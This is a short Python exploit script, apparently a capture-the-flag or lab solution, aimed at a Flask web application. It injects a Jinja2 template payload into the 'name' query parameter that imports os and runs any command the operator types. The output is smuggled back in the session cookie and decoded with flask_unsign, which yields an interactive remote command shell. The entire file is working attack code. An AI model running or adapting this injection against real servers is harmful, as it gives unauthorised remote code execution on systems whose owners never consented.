#!/usr/bin/python3

import requests
import sys
from urllib.parse import (
    unquote,
    quote
)
import flask_unsign

def exploit(url):

    payload = """{%+if+session.update({request.args.se:request.application.__globals__.__builtins__.__import__(request.args.os).popen(request.args.command).read()})+==+1+%}{%+endif+%}&se=arturo&os=os&command="""

    print("\n\n")
    if requests.get(url=url).status_code == 200:
        while True:
            cmd = input("#> ")
            if cmd == "exit":
                exit(1)
            sess = requests.session()
            sess.get(url=url+f"?name={payload}{cmd}")
            cookies_sess = sess.cookies.get_dict()['session']

            print(flask_unsign.decode(str(cookies_sess))['arturo'].decode())

def main():

    url = sys.argv[1]
    exploit(url)

if __name__ == "__main__":
    main()

